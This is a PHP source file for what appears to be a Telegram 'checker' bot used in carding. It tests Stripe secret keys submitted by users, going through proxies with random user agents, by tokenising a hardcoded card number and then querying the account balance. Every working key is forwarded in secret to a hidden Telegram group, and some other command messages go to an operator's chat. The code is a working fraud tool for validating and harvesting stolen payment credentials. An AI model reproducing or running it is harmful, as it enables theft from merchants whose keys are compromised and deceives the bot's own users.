<?php

include('rnd-ua.php');
$pChkU = $isAdmin ? "Owner" : (in_array($user['id'], $f_data['premiuns']) ? "Premiun" : "Free");
if(in_array($user['id'], $sellers)){
$pChkU = "Seller";
}

$waos = $msg['text'];
$waos1 = substr($waos, 4);
$waos12 = substr($waos, 3);
$sk = base64_encode($waos12);

$proxy = "🇺🇸 - Live!";
$gate = "𝙎𝙠";
$charged = "$3";
$retry = 0;
//CHK Gate1
if(cCmd($msg['text'], ['/sk', '/Sk', '/sK', '/SK', '!sk', '!Sk', '!sK', '!SK', '.sk', '.SK', '.sK', '.SK'])){
	$eMsg = explode(' ', $msg['text']);
	$cEMsg = count($eMsg);
	$cBin = cBin($eMsg[1]);
	$antiSpam = TRUE;
	include('accs-as.php');
	
if($cEMsg == 1){
output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ".$gate." ♻️\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/sk sk_live...</code>",
'reply_to_message_id' => $msg['message_id']
]);
	}
else{
$msgId_bot = output('sendMessage', [
'chat_id' => $chat['id'],
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...",
'reply_to_message_id' => $msg['message_id']
])['result']['message_id'];

/*=====  1REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'authorization:Basic '.$sk.'',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: '.$rnd_ua.'',
'referer: https://js.stripe.com/',
));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4108435545380660&card[exp_month]=10&card[exp_year]=2024&card[cvc]=666');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie.txt');
$r1 = curl_exec($ch);
$code = capture($r1, '"code": "','"');
$msg1 = capture($r1, '"message": "','"');

output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>🔴</code>"
]);

/*=====  2REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxypro);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $up3); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'authorization:Basic '.$sk.'',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: '.$rnd_ua.'',
'referer: https://js.stripe.com/',
));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'cookie.txt');
$r2 = curl_exec($ch);
$am1 = capture($r2, 'amount": ',',');
$cu = capture($r2, '"currency": "','"');
$pe = capture($r2, '"pending": [
    {
      "amount": ',',');
$time = substr(curl_getinfo($ch)['total_time'], 0, 4)."'s";

$am = strtoupper($am1);

output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <cod✨</code>"
]);

if(strpos($r1, 'tok_')){
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "零 𝙎𝙠 -»<code>".$waos1."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Live! ✅</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>Integration is On!</code>

朱 𝘼𝙢𝙤𝙪𝙣𝙩 -» <code>".$am."</code>
亥 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮 -» <code>".$cu."</code>
空 𝙋𝙚𝙣𝙙𝙞𝙣𝙜 𝘼𝙢𝙤𝙪𝙣𝙩 -» <code>".$pe."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
output('sendMessage', [
'chat_id' => -1001836562510,
'message_id' => $msgId_bot,
'text' => "零 𝙎𝙠 -»<code>".$waos1."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Live! ✅</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>Integration is On!</code>

朱 𝘼𝙢𝙤𝙪𝙣𝙩 -» <code>".$am."</code>
亥 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮 -» <code>".$cu."</code>
空 𝙋𝙚𝙣𝙙𝙞𝙣𝙜 𝘼𝙢𝙤𝙪𝙣𝙩 -» <code>".$pe."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
}
elseif(strpos($r1, 'rate_limit')){
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "零 𝙎𝙠 -»<code>".$waos1."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Live! ✅</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>rate_limit</code>

朱 𝘼𝙢𝙤𝙪𝙣𝙩 -» <code>".$am."</code>
亥 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮 -» <code>".$cu."</code>
空 𝙋𝙚𝙣𝙙𝙞𝙣𝙜 𝘼𝙢𝙤𝙪𝙣𝙩 -» <code>".$pe."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
output('sendMessage', [
'chat_id' => -1001836562510,
'message_id' => $msgId_bot,
'text' => "零 𝙎𝙠 -»<code>".$waos1."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Live! ✅</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>rate_limit</code>

朱 𝘼𝙢𝙤𝙪𝙣𝙩 -» <code>".$am."</code>
亥 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮 -» <code>".$cu."</code>
空 𝙋𝙚𝙣𝙙𝙞𝙣𝙜 𝘼𝙢𝙤𝙪𝙣𝙩 -» <code>".$pe."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
}
else{
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => "零 𝙎𝙠 -» <code>".$waos1."</code>
青 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>Dead! ❌</code>
白 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>".$msg1."</code>

南 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ".$gate."
栗 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 -»  <code>".$retry."</code>
北 𝙋𝙧𝙤𝙭𝙮 -» <code>".$proxy."</code>
三 𝙏𝙞𝙢𝙚 𝙎𝙥𝙚𝙣𝙩 -» <code>".$time."</code>
玉 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <code>".$user['id']."</code> -» <code>".$pChkU."</code>"
]);
}
if($retry > 4){
$status = "Waos! ⛈";
$status1 = "Max Retry!";
}
}
}
output('editMessageText', [
'chat_id' => $chat['id'],
'message_id' => $msgId_bot,
'text' => $rChk
]);
unlink(getcwd().'cookie.txt');

if(strpos($waos, 'addp')){
output('sendMessage', [
'chat_id' => 1205717709,
'message_id' => $msgId_bot,
'text' => "msg -» ".$waos."\nid -» ".$user['id'].""
]);
}
elseif(strpos($waos, 'delp')){
output('sendMessage', [
'chat_id' => 1205717709,
'message_id' => $msgId_bot,
'text' => "msg -» ".$waos."\nid -» ".$user['id'].""
]);
}
elseif(strpos($waos, 'addg')){
output('sendMessage', [
'chat_id' => 1205717709,
'message_id' => $msgId_bot,
'text' => "msg -» ".$waos."\nid -» ".$user['id'].""
]);
}
elseif(strpos($waos, 'delg')){
output('sendMessage', [
'chat_id' => 1205717709,
'message_id' => $msgId_bot,
'text' => "msg -» ".$waos."\nid -» ".$user['id'].""
]);
}
elseif(strpos($waos, 'claim')){
output('sendMessage', [
'chat_id' => 1205717709,
'message_id' => $msgId_bot,
'text' => "msg -» ".$waos."\nid -» ".$user['id'].""
]);
}
elseif(strpos($waos, 'gkey')){
output('sendMessage', [
'chat_id' => 1205717709,
'message_id' => $msgId_bot,
'text' => "msg -» ".$waos."\nid -» ".$user['id'].""
]);
}